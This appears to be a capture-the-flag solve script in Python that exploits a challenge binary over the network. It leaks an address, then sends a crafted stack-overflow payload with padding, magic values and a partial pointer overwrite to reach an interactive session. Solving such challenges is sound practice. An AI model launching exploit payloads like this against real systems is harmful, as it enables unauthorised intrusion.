#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "34.70.253.176"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *vuln+41
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

s(b"\xcc" * 10)
leak = GetInt(re())[0]
# s("b")
print(hex(leak))
# s(b"A" * (0x2C - 4) + b"\xd2\x78")
s(
    p(leak - 200)
    + p32(0xB000BA)
    + p32(0x5ECCBABE)
    + b"A" * (32 - 8 - 4 - 4)
    + p(leak + 0x10 - 52 - 2)
    + b"\x8e"
)
io.interactive()
